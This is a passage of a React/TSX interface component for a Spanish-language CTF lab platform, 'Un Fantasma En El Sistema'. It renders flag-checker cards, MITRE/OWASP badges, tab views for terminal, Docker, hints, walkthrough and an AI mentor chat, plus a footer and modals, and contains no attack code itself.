                    <span className="text-[11px] text-slate-400 block mb-1">Vector Inicial (Foothold)</span>
                    <span className="text-xs font-semibold text-slate-200">{scenario.vector}</span>
                  </div>

                  <div className="p-3.5 bg-slate-950/60 rounded-xl border border-slate-800">
                    <span className="text-[11px] text-slate-400 block mb-1">Escalada de Privilegios</span>
                    <span className="text-xs font-semibold text-slate-200">{scenario.secondaryVector}</span>
                  </div>
                </div>

                {/* MITRE & OWASP Standards Teaser Banner */}
                <div className="p-4 bg-slate-950/70 rounded-xl border border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2">
                      <Shield className="w-4 h-4 text-cyan-400" />
                      <span className="text-xs font-bold text-slate-200 uppercase tracking-wide">
                        Alineación MITRE ATT&CK® & OWASP Top 10
                      </span>
                    </div>
                    <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
                      <span
                        className={`text-[10px] font-mono px-2 py-0.5 rounded font-bold border ${
                          currentCVSS.severity === 'Critical'
                            ? 'bg-rose-950/80 text-rose-300 border-rose-800/80'
                            : currentCVSS.severity === 'High'
                            ? 'bg-amber-950/80 text-amber-300 border-amber-800/80'
                            : 'bg-emerald-950/80 text-emerald-300 border-emerald-800/80'
                        }`}
                      >
                        CVSS {currentCVSS.score.toFixed(1)} {currentCVSS.severity}
                      </span>
                      {currentFrameworks.mitre.slice(0, 3).map((m) => (
                        <span
                          key={m.id}
                          className="text-[10px] font-mono px-2 py-0.5 bg-blue-950/80 text-blue-300 border border-blue-800/60 rounded font-semibold"
                        >
                          {m.id}: {m.name}
                        </span>
                      ))}
                      {currentFrameworks.owasp.slice(0, 2).map((o) => (
                        <span
                          key={o.code}
                          className="text-[10px] font-mono px-2 py-0.5 bg-amber-950/80 text-amber-300 border border-amber-800/60 rounded font-semibold"
                        >
                          {o.code}: {o.name}
                        </span>
                      ))}
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => setActiveTab('frameworks')}
                    className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold text-cyan-300 bg-cyan-950/60 hover:bg-cyan-900/80 border border-cyan-800/60 rounded-lg transition-colors cursor-pointer shrink-0"
                  >
                    <span>Ver Matriz Táctica</span>
                    <ArrowRight className="w-3.5 h-3.5" />
                  </button>
                </div>

                {/* Live Flag Verification System with Animations */}
                <div className="space-y-2">
                  <div className="flex items-center justify-between px-1 flex-wrap gap-2">
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-bold text-slate-300 tracking-wide uppercase">
                        Comprobación de Banderas en Vivo
                      </span>
                      <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-cyan-950/80 text-cyan-400 border border-cyan-800/60 font-semibold">
                        Live Flag Checker
                      </span>
                      <span className="text-[10px] font-mono text-slate-400 bg-slate-900 border border-slate-800 px-2 py-0.5 rounded">
                        Progreso: {(userFlagSolved ? 1 : 0) + (rootFlagSolved ? 1 : 0)}/2
                      </span>
                    </div>

                    {userFlagSolved && rootFlagSolved ? (
                      <button
                        type="button"
                        onClick={() => setIsCertificateModalOpen(true)}
                        className="flex items-center gap-1.5 px-3.5 py-1 text-xs font-bold rounded-lg bg-gradient-to-r from-amber-400 via-yellow-300 to-amber-400 text-slate-950 hover:brightness-110 shadow-lg shadow-amber-950/60 transition-all cursor-pointer animate-pulse"
                        title="Ver y descargar tu Certificado Oficial de Superación con sello SHA-256"
                      >
                        <Award className="w-4 h-4 text-slate-950" />
                        <span>¡Descargar Diploma Oficial!</span>
                      </button>
                    ) : (
                      <span className="text-[11px] text-slate-500">
                        Valida ambas banderas para desbloquear tu Diploma Oficial
                      </span>
                    )}
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <FlagCheckerCard
                      flagType="user"
                      title="Bandera de Usuario (User Flag)"
                      expectedFlag={scenario.userFlag}
                      flagPath={scenario.userFlagPath}
                      points={50}
                      onSuccess={handleUserFlagSuccess}
                    />

                    <FlagCheckerCard
                      flagType="root"
                      title="Bandera de Root (System Flag)"
                      expectedFlag={scenario.rootFlag}
                      flagPath={scenario.rootFlagPath}
                      points={100}
                      onSuccess={handleRootFlagSuccess}
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Creator & Brand Attribution Card */}
            <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-slate-900/90 via-slate-900/70 to-slate-950/90 border border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-4">
              <div className="flex items-center gap-4">
                <a
                  href="https://www.unfantasmaenelsistema.com/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="shrink-0 transition-transform hover:scale-105"
                  title="Visitar Un Fantasma En El Sistema"
                >
                  <img
                    src="/logo-icon-unfantasmaenelsistema.png"
                    alt="Logo Un Fantasma En El Sistema"
                    className="w-12 h-12 rounded-xl p-1 bg-slate-950 border border-slate-700/80 object-contain shadow-md"
                    onError={(e) => {
                      (e.target as HTMLImageElement).src =
                        'https://www.unfantasmaenelsistema.com/wp-content/uploads/2019/12/log3.png';
                    }}
                  />
                </a>
                <div>
                  <div className="flex items-center gap-2">
                    <a
                      href="https://www.unfantasmaenelsistema.com/"
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-sm font-bold text-white hover:text-cyan-400 transition-colors"
                    >
                      Un Fantasma En El Sistema
                    </a>
                    <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/80 border border-cyan-800/60 px-1.5 py-0.5 rounded">
                      Portal Oficial
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Seguridad Informática, Hacking Ético, Análisis de Vulnerabilidades y Formación Práctica.
                  </p>
                </div>
              </div>

              <a
                href="https://www.unfantasmaenelsistema.com/"
                target="_blank"
                rel="noopener noreferrer"
                className="shrink-0 inline-flex items-center gap-2 px-3.5 py-2 text-xs font-semibold text-cyan-300 hover:text-white bg-slate-800/80 hover:bg-slate-700/80 rounded-xl border border-slate-700 hover:border-cyan-500/50 transition-all shadow-sm group"
              >
                <Globe className="w-4 h-4 text-cyan-400 group-hover:rotate-12 transition-transform" />
                <span>www.unfantasmaenelsistema.com</span>
                <ExternalLink className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-400 transition-colors" />
              </a>
            </div>

            {/* Featured Action Navigation Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
              <button
                type="button"
                onClick={() => setActiveTab('dashboard')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-amber-950/60 border border-amber-800/40 text-amber-400 w-fit mb-3">
                  <Trophy className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Mi Progreso & Nivel</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-amber-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Historial de retos superados, tiempo dedicado en cada máquina y nivel de usuario.
                </p>
              </button>

              <button
                type="button"
                onClick={() => setIsImportModalOpen(true)}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-purple-950/60 border border-purple-800/40 text-purple-400 w-fit mb-3">
                  <Upload className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Importar / Drag & Drop</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-purple-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Carga o comparte archivos .json o .yaml arrastrándolos a la pantalla.
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('terminal')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-emerald-950/60 border border-emerald-800/40 text-emerald-400 w-fit mb-3">
                  <Terminal className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Terminal Web Shell</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-emerald-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Practica comandos reales (nmap, curl, smbclient) contra {scenario.ip} antes de Docker.
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('frameworks')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-blue-950/60 border border-blue-800/40 text-blue-400 w-fit mb-3">
                  <Shield className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>MITRE & OWASP</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-blue-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Mapeo táctico a técnicas ({currentFrameworks.mitre.length}) y riesgos OWASP ({currentFrameworks.owasp.length}).
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('stats')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-cyan-950/60 border border-cyan-800/40 text-cyan-400 w-fit mb-3">
                  <BarChart3 className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Estadísticas del Lab</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-cyan-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Métricas Recharts: dificultad, vectores de ataque y {totalFlagsGenerated} banderas.
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('hints')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-amber-950/60 border border-amber-800/40 text-amber-400 w-fit mb-3">
                  <HelpCircle className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Pistas Graduales ({scenario.hints?.length || 6})</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-amber-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Guía escalonada en 3 niveles (Orientación Conceptual, Pista Táctica y Vector Dirigido).
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('docker')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-cyan-950/60 border border-cyan-800/40 text-cyan-400 w-fit mb-3">
                  <Layers className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Docker Compose</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-cyan-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Despliega el laboratorio localmente con el comando <code className="text-cyan-300 font-mono">docker compose up</code>.
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('topology')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-rose-950/60 border border-rose-800/40 text-rose-400 w-fit mb-3">
                  <Server className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Topología & Puertos ({scenario.openPorts.length})</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-rose-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Inspecciona la arquitectura de red, túneles VPN y servicios expuestos.
                </p>
              </button>

              <button
                type="button"
                onClick={() => setActiveTab('python')}
                className="text-left p-5 rounded-xl border border-slate-800 bg-slate-900/50 hover:bg-slate-900 hover:border-slate-700 transition-all group cursor-pointer"
              >
                <div className="p-2.5 rounded-lg bg-emerald-950/60 border border-emerald-800/40 text-emerald-400 w-fit mb-3">
                  <FileCode className="w-5 h-5" />
                </div>
                <h3 className="font-semibold text-sm text-slate-100 flex items-center justify-between">
                  <span>Script Python 3 CLI</span>
                  <ArrowRight className="w-4 h-4 text-slate-500 group-hover:text-emerald-400 group-hover:translate-x-0.5 transition-all" />
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Generador CLI descargable con simulador de terminal y aleatorización.
                </p>
              </button>
            </div>

            {/* Writeup & Mentor Teaser */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div className="border border-slate-800 bg-slate-900/40 rounded-xl p-5 space-y-3">
                <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <BookOpen className="w-4 h-4 text-cyan-400" />
                    <h3 className="text-sm font-semibold text-slate-200">Guía de Resolución & Writeup</h3>
                  </div>
                  <button
                    type="button"
                    onClick={() => setActiveTab('walkthrough')}
                    className="text-xs text-cyan-400 hover:underline cursor-pointer"
                  >
                    Ver completo
                  </button>
                </div>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Incluye la cadena completa de explotación paso a paso, comandos educativos de prueba y la sección crucial de <strong>Mitigaciones Defensivas</strong> para enseñar buenas prácticas a los alumnos.
                </p>
              </div>

              <div className="border border-slate-800 bg-slate-900/40 rounded-xl p-5 space-y-3">
                <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                  <div className="flex items-center gap-2">
                    <Sparkles className="w-4 h-4 text-cyan-400" />
                    <h3 className="text-sm font-semibold text-slate-200">Mentor IA para Retos CTF</h3>
                  </div>
                  <button
                    type="button"
                    onClick={() => setActiveTab('mentor')}
                    className="text-xs text-cyan-400 hover:underline cursor-pointer"
                  >
                    Abrir chat
                  </button>
                </div>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Conversa en tiempo real con 4 roles de ingeniería (Arquitecto CTF, DevSecOps & Bash, Auditor de Seguridad, Diseñador de Pistas) potenciado por Gemini.
                </p>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'dashboard' && (
          <UserDashboardView
            scenariosCatalog={scenariosCatalog}
            activeScenario={scenario}
            progressMap={progressMap}
            currentLabSessionSeconds={currentLabSessionSeconds}
            onSelectScenario={(newSc) => {
              setScenario(newSc);
              setActiveTab('overview');
            }}
            onOpenDiploma={handleOpenDiplomaForScenario}
            onToggleLabFlag={handleToggleLabFlag}
            onResetProgress={handleResetProgress}
          />
        )}

        {activeTab === 'terminal' && (
          <TerminalPlaygroundView scenario={scenario} />
        )}

        {activeTab === 'frameworks' && (
          <SecurityFrameworksView scenario={scenario} />
        )}

        {activeTab === 'stats' && (
          <LabStatsView
            currentScenario={scenario}
            scenariosCatalog={scenariosCatalog}
            totalFlagsGenerated={totalFlagsGenerated}
            onSelectScenario={(selected) => {
              setScenario(selected);
              setActiveTab('overview');
            }}
            onIncrementFlags={() => setTotalFlagsGenerated((prev) => prev + 2)}
          />
        )}

        {activeTab === 'hints' && (
          <HintsView
            hints={scenario.hints || []}
            difficulty={scenario.difficulty}
            vector={scenario.vector}
            codename={scenario.codename}
          />
        )}

        {activeTab === 'docker' && (
          <DockerComposeView
            dockerCompose={scenario.dockerCompose}
            dockerfile={scenario.dockerfile}
            provisionScript={scenario.provisionScript}
            codename={scenario.codename}
            ip={scenario.ip}
          />
        )}

        {activeTab === 'topology' && (
          <TopologyView
            topology={scenario.topology}
            openPorts={scenario.openPorts}
            ip={scenario.ip}
            codename={scenario.codename}
          />
        )}

        {activeTab === 'code' && (
          <CodeViewer
            provisionScript={scenario.provisionScript}
            dockerfile={scenario.dockerfile}
            dockerCompose={scenario.dockerCompose}
            codename={scenario.codename}
          />
        )}

        {activeTab === 'python' && (
          <PythonScriptView
            pythonScript={scenario.pythonScript}
            codename={scenario.codename}
            themeName={scenario.themeName}
            difficulty={scenario.difficulty}
            vector={scenario.vector}
            userFlag={scenario.userFlag}
            rootFlag={scenario.rootFlag}
          />
        )}

        {activeTab === 'walkthrough' && (
          <WalkthroughView
            walkthrough={scenario.walkthrough}
            codename={scenario.codename}
            userFlag={scenario.userFlag}
            rootFlag={scenario.rootFlag}
            userFlagPath={scenario.userFlagPath}
            rootFlagPath={scenario.rootFlagPath}
            scenario={scenario}
          />
        )}

        {activeTab === 'poster' && (
          <ImageGeneratorView
            currentArtUrl={scenario.machineArtUrl}
            codename={scenario.codename}
            themeName={scenario.themeName}
            onSetArtUrl={(url) => setScenario((prev) => ({ ...prev, machineArtUrl: url }))}
          />
        )}

        {activeTab === 'mentor' && (
          <GeminiChatbotView
            currentScenarioSummary={`Máquina: "${scenario.themeName}" (${scenario.codename}), Dificultad: ${scenario.difficulty}, Vector: ${scenario.vector}, Escalada: ${scenario.secondaryVector}.`}
          />
        )}
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-800/80 bg-slate-950 py-8 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
          <div className="flex flex-col sm:flex-row items-center gap-4 text-center sm:text-left">
            <a
              href="https://www.unfantasmaenelsistema.com/"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-block transition-transform hover:scale-[1.02] shrink-0"
              title="Un Fantasma En El Sistema - Seguridad Informática"
            >
              <img
                src="/logo-unfantasmaenelsistema.png"
                alt="Un Fantasma En El Sistema"
                className="h-10 w-auto object-contain bg-slate-900/60 p-1.5 rounded-lg border border-slate-800/80 shadow-sm"
                onError={(e) => {
                  (e.target as HTMLImageElement).src =
                    'https://www.unfantasmaenelsistema.com/wp-content/uploads/2019/06/cropped-unfantasmaenelsistema-4.png';
                }}
              />
            </a>
            <div>
              <p className="text-xs font-semibold text-slate-300">
                Un Fantasma En El Sistema
              </p>
              <p className="text-[11px] text-slate-500">
                Seguridad informática, hacking ético, guías de ciberdefensa y desarrollo de escenarios CTF.
              </p>
            </div>
          </div>

          <div className="flex flex-wrap items-center justify-center gap-3 sm:gap-4 text-xs font-medium">
            <a
              href="https://www.unfantasmaenelsistema.com/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-cyan-400 hover:text-cyan-300 inline-flex items-center gap-1.5 transition-colors"
            >
              <Globe className="w-3.5 h-3.5" />
              <span>unfantasmaenelsistema.com</span>
              <ExternalLink className="w-3 h-3 text-cyan-500" />
            </a>
            <span className="text-slate-800 hidden sm:inline">|</span>
            <a
              href="https://ghostacademy.unfantasmaenelsistema.com/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-slate-400 hover:text-slate-200 transition-colors"
            >
              GhostAcademy
            </a>
            <span className="text-slate-800 hidden sm:inline">|</span>
            <span className="text-slate-400">
              NetPhantom CTF
            </span>
          </div>
        </div>
      </footer>

      {/* New Scenario Configuration Modal */}
      <ScenarioConfigModal
        isOpen={isConfigModalOpen}
        onClose={() => setIsConfigModalOpen(false)}
        onGenerate={handleGenerateScenario}
        isGenerating={isGenerating}
      />

      {/* Export Lab Bundle Modal */}
      <ExportLabModal
        isOpen={isExportModalOpen}
        onClose={() => setIsExportModalOpen(false)}
        scenario={scenario}
      />

      {/* Import Custom Scenario Modal */}
      <ImportScenarioModal
        isOpen={isImportModalOpen}
        onClose={() => setIsImportModalOpen(false)}
        onImport={handleImportScenario}
      />

      {/* Global Drag and Drop Overlay for .json / .yaml files */}
      {isGlobalDragging && (
        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md flex flex-col items-center justify-center p-6 border-4 border-dashed border-cyan-400 animate-in fade-in duration-150 pointer-events-none">
          <div className="w-20 h-20 rounded-2xl bg-cyan-950/90 border border-cyan-700 text-cyan-400 flex items-center justify-center mb-4 shadow-2xl shadow-cyan-950 animate-bounce">
            <Upload className="w-10 h-10" />
          </div>
          <h2 className="text-2xl font-bold text-white text-center">
            Suelta tu archivo de reto aquí
          </h2>
          <p className="text-sm font-mono text-cyan-300 mt-2 text-center max-w-md">
            Importación automática de archivos <span className="underline">.json</span> o <span className="underline">.yaml</span> para profesores y alumnos.
          </p>
        </div>
      )}

      {/* Success Import Toast */}
      {importToast && (
        <div className="fixed bottom-6 right-6 z-50 bg-emerald-950 border border-emerald-700 text-emerald-200 px-4 py-3 rounded-xl shadow-2xl flex items-center gap-2.5 animate-in slide-in-from-bottom-5 duration-200">
          <Check className="w-4 h-4 text-emerald-400 shrink-0" />
          <span className="text-xs font-semibold">{importToast}</span>
        </div>
      )}

      {/* Official Certificate / Diploma of Completion Modal */}
      <CertificateModal
        isOpen={isCertificateModalOpen}
        onClose={() => {
          setIsCertificateModalOpen(false);
          setDiplomaScenario(null);
        }}
        scenario={diplomaScenario || scenario}
      />
    </div>
  );
}
